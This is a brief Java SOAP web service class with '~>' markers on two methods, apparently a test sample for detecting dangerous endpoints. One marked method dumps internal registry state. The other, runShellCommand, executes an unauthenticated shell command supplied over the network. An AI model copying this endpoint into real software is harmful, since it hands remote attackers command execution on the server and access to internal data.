package com.shop.ws;

import javax.jws.WebMethod;
import javax.jws.WebService;

@WebService(serviceName = "Ops")
public class OpsEndpoint {

    @WebMethod(operationName = "state")
~>    public String dumpState() {
        return Registry.snapshot();
    }

    @WebMethod
    @WebResult(name = "out")
~>    public String runShellCommand(@WebParam(name = "cmd") String cmd) throws Exception {
        return Shell.exec(cmd);
    }

    @WebMethod
    public String listOrders() {
        return "[]";
    }
}
